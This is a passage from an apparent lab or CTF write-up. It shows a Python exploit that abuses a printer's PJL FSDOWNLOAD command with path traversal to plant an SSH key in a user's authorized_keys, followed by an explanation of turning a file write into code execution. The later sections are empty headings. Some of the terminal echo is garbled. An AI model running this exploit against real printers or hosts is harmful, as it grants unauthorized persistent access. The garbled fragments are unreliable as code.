header = b'@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=%d\n' % len(key)
s.send(header)
s.send(key)
s.close()
print('[+] Key written')
"python3 -c "
> import socket
<wjaomtdukTbpXgEakgQuRaNwGTYksXWczRhf0= kali@kali\n'
> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
> s.connect(('127.0.0.1', 9100))
<hivist/.ssh/authorized_keys\" SIZE=%d\n' % len(key)
> s.send(header)
> s.send(key)
> s.close()
> print('[+] Key written')
> 
"
[+] Key written
```

**Key finding:** The same PJL flaw supports arbitrary file _write_ via `FSDOWNLOAD`, not just read. The `[+] Key written` confirms the bytes were sent; successful authentication is verified in the next step. Writing to `authorized_keys` escalates a read primitive into a full interactive session as the target user.

**Theory block — read primitive vs. write primitive:** A file-read bug (like the earlier `FSUPLOAD`) leaks secrets but leaves you in the same shell. A file-_write_ bug is stronger: by writing to a location the target account trusts — `~/.ssh/authorized_keys`, a cron file, `.bashrc` — you convert "I can write a file" into "I can execute as that user." Writing an SSH public key is the cleanest of these because it yields a stable, interactive session rather than a fragile shell. Note this only works if `~/.ssh` exists with correct ownership/permissions; SSH ignores `authorized_keys` in a world-writable or wrongly-owned directory.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

